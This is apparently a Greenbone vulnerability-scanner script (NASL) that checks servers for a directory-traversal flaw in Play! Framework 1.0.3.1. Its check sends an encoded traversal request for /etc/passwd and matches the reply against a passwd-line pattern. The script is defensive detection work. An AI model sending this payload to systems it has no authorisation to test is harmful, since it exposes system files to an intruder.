if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.100757" );
	script_version( "2020-08-24T15:18:35+0000" );
	script_tag( name: "last_modification", value: "2020-08-24 15:18:35 +0000 (Mon, 24 Aug 2020)" );
	script_tag( name: "creation_date", value: "2010-08-11 13:11:12 +0200 (Wed, 11 Aug 2010)" );
	script_bugtraq_id( 42340 );
	script_name( "Play! Framework Directory Traversal Vulnerability" );
	script_xref( name: "URL", value: "https://www.securityfocus.com/bid/42340" );
	script_xref( name: "URL", value: "http://www.playframework.org/" );
	script_tag( name: "cvss_base", value: "5.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:N/I:N/A:P" );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_category( ACT_ATTACK );
	script_family( "Web application abuses" );
	script_copyright( "Copyright (C) 2010 Greenbone Networks GmbH" );
	script_dependencies( "gb_get_http_banner.sc" );
	script_mandatory_keys( "Play_Framework/banner" );
	script_require_ports( "Services/www", 9000 );
	script_tag( name: "summary", value: "The Play! Framework is prone to a directory-traversal vulnerability
  because it fails to sufficiently sanitize user-supplied input." );
	script_tag( name: "impact", value: "Remote attackers can use a specially crafted request with directory-
  traversal sequences to read arbitrary files in the context of the user running the affected
  application. Information obtained could aid in further attacks." );
	script_tag( name: "affected", value: "Play! 1.0.3.1 is vulnerable, other versions may also be affected." );
	script_tag( name: "solution_type", value: "WillNotFix" );
	script_tag( name: "solution", value: "No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore.
  General solution options are to upgrade to a newer release, disable respective features,
  remove the product or replace the product by another one." );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
port = http_get_port( default: 9000 );
banner = http_get_remote_headers( port: port );
if(!banner || !ContainsString( banner, "Server: Play! Framework" )){
	exit( 0 );
}
url = NASLString( "/public/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd" );
if(http_vuln_check( port: port, url: url, pattern: "root:.*:0:[01]:" )){
	report = http_report_vuln_url( port: port, url: url );
	security_message( port: port, data: report );
	exit( 0 );
}
exit( 0 );

